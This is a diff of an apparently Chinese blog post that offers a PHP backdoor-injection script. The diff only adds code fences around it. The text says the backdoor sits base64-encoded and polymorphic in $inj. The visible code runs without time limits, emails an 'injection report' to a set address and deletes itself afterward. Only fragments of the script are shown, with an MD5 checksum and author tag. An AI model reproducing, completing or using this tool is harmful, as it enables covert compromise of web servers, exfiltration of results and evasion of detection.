@@ -20,7 +20,7 @@ code都写明的，有需要的请自己看
 [后门](/tags/%E5%90%8E%E9%97%A8)写在$inj里面，要做base64 encode的Polymorphic
 不希望这个东西被搞破坏的人拿去玩
 懂原理的就自个儿收下吧
-
+```php
 <?php
 set_time_limit(0);
 ignore_user_abort(1);
@@ -63,7 +63,7 @@ if($log_email) { $report = file_get_contents('__tmp'); mail($email, "injection r
 if($delete_me) { unlink(__file__); }
 exit;
 ?>
-
+```
 MD5 checksum:DE734BDAC73E6ECE8DD3DB40416976E8
 #f3v3r
 
